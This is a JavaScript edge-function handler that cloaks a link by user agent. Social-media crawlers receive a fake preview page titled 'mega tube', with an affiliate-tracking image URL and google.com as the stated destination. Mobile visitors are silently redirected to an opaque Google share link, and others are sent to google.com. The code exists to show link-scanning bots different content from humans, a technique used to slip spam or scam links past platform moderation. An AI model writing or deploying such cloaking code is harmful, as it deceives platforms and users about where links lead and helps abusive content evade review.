export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️mega tube 🧡">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://go.skimresources.com/?id=130832X1595857&isjs=1&jv=15.7.1&sref=https%3A%2F%2Fwww.gminsidenews.com%2Fthreads%2Ftrumps-openness-to-chinese-vehicle-us-assembly-ripped-by-uaw-leader.311523%2F&url=https%3A%2F%2Fscontent.fkhi4-2.fna.fbcdn.net%2Fv%2Ft39.30808-6%2F813932511_122193619640911736_6500127941660658307_n.jpg%3Fstp%3Ddst-jpg_tt6%26cstp%3Dmx1200x630%26ctp%3Ds960x960%26_nc_cat%3D107%26_nc_map%3Durlgen_bucketless%26ccb%3D1-7%26_nc_sid%3D127cfc%26_nc_eui2%3DAeHhBJmTWZKtJOPq_ltTW-LTMEGM0aTiIygwQYzRpOIjKMlcUvrsnsflpS-jqZcTHfnN8u_A_GiglYlvxQog-29B%26_nc_ohc%3DWkvg9zi-QLEQ7kNvwG5SDQH%26_nc_oc%3DAdokN33APml_Tct7NsyHUQiCiuXkjXT-o9qo7i9Hg0D13iTqDsTPmhpnwcWXohpJHaU%26_nc_zt%3D23%26_nc_ht%3Dscontent.fkhi4-2.fna%26_nc_gid%3Dvwj9HkcqPLfm9T3if9fKwQ%26_nc_ss%3D7b2a8%26oh%3D00_AQIOAcnBzNVHHcpkiTyugvem9IaBh51t13-tqaKKjvTglg%26oe%3D6AB2B296&xs=1&xtz=-300&xuuid=d140d547bd3b0b668e5b4fba8a489e78&xjsf=other_click__auxclick%20%5B2%5D">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://www.google.com/share.google?q=BSN8Os0U4KWtt5cdN", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
